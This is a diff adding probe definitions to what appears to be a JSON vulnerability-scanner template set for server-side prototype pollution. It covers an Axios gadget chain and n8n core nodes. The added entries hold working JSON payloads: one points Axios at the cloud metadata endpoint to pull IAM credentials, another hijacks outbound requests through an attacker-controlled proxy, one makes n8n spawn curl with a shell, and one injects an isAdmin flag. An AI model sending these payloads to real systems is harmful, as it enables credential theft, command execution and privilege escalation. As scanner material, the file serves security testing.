@@ -624,7 +624,136 @@
           }
         }
       ]
+    },
+    "axios_rce_gadget_2026": {
+      "description": "CVE-2026-40175 — Axios prototype-pollution → RCE gadget chain. When any dependency pollutes Object.prototype with a malicious `defaults` or `transformRequest` chain, Axios escalates the pollution into RCE OR cloud-metadata exfil (axios uses polluted defaults to choose request URL/handler). Pure black-box: pollute via any vector then issue a controlled outbound HTTP call.",
+      "tech_match": [
+        "axios",
+        "Node.js",
+        "Express",
+        "Next.js",
+        "NestJS"
+      ],
+      "param_match": [
+        "__proto__",
+        "constructor",
+        "config",
+        "options"
+      ],
+      "probes": [
+        {
+          "payload": "{\"__proto__\":{\"baseURL\":\"http://169.254.169.254\",\"transformRequest\":[]}}",
+          "description": "Pollute axios defaults.baseURL → next axios.get('/latest/meta-data/...') hits IMDS instead of intended host. Confirm by following the response or observing OOB collaborator interaction.",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "ami-id",
+                "iam/security-credentials",
+                "subscriptionId",
+                "computeMetadata"
+              ],
+              "condition": "or"
+            },
+            {
+              "type": "collaborator",
+              "interaction_types": [
+                "HTTP",
+                "DNS"
+              ]
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 80,
+          "variables": {
+            "manual_chain": true,
+            "requires_collaborator": false,
+            "content_type": "application/json"
+          }
+        },
+        {
+          "payload": "{\"constructor\":{\"prototype\":{\"adapter\":\"http\",\"proxy\":{\"host\":\"COLLABORATOR\",\"port\":80}}}}",
+          "description": "Pollute Axios proxy config → all subsequent outbound requests routed through Collaborator. Confirm via Collaborator HTTP receipt of any outbound call after pollution.",
+          "matchers": [
+            {
+              "type": "collaborator",
+              "interaction_types": [
+                "HTTP"
+              ]
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 75,
+          "variables": {
+            "manual_chain": true,
+            "requires_collaborator": true,
+            "content_type": "application/json"
+          }
+        }
+      ]
+    },
+    "n8n_node_pp_rce_2026": {
+      "description": "CVE-2026-44789/44790/44791 — n8n HTTP-Request / Git / XML core nodes accept attacker-controlled pagination/options params that flow into a recursive merge sink. Polluted prototype reaches Node's `child_process.spawn` argv via the workflow execution engine. Critical pre-auth on hosted-workflow webhook endpoints.",
+      "tech_match": [
+        "n8n"
+      ],
+      "param_match": [
+        "pagination",
+        "options",
+        "headers",
+        "qs",
+        "body"
+      ],
+      "probes": [
+        {
+          "payload": "{\"pagination\":{\"__proto__\":{\"argv0\":\"/usr/bin/curl\",\"shell\":true}}}",
+          "description": "n8n HTTP Request node — pagination.__proto__ pollution. Confirm via Collaborator (set polluted argv to curl COLLABORATOR_URL).",
+          "matchers": [
+            {
+              "type": "collaborator",
+              "interaction_types": [
+                "HTTP",
+                "DNS"
+              ]
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 80,
+          "variables": {
+            "manual_chain": true,
+            "requires_collaborator": true,
+            "content_type": "application/json"
+          }
+        },
+        {
+          "payload": "{\"options\":{\"constructor\":{\"prototype\":{\"isAdmin\":true}}}}",
+          "description": "n8n options-param constructor.prototype canary — bypasses __proto__ key filters; reflected isAdmin in subsequent workflow execution → server-side PP confirmed.",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200,
+                500
+              ]
+            },
+            {
+              "type": "word",
+              "words": [
+                "isAdmin",
+                "true"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 65,
+          "variables": {
+            "manual_chain": true,
+            "content_type": "application/json"
+          }
+        }
+      ]
     }
   },
-  "description": ". v1.0 black-box variants: Express default-property pollution (json spaces / status), Fastify AJV pollution, Hapi event pollution, exec_argv RCE chain, side-channel sentinel detection."
+  "description": ". v1.0 black-box variants: Express default-property pollution (json spaces / status), Fastify AJV pollution, Hapi event pollution, exec_argv RCE chain, side-channel sentinel detection. 2026 H2: axios PP gadget (CVE-2026-40175) for cloud-metadata exfil + proxy hijack; n8n core-node PP (CVE-2026-44789/90/91)."
 }
